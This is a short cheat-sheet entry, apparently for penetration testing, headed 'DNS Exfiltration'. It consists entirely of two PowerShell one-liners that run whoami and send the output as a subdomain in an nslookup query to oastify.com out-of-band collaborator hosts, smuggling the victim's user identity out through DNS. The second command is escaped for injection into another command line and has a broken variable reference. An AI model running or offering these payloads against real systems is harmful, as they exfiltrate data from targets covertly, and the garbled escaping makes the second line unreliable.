# DNS Exfiltration
```powershell
$z=(whoami); nslookup -q=txt "$z.mf5xpzz0sucja0jcflgppyshm8szgu4j.oastify.com"

# or

powershell -c \"\a=\(whoami);\$data = '.v3zz09mtkgm21z2cjatuzsv9o0urih66.oastify.com';\$new = \$a+\$data;nslookup \$new\"
```

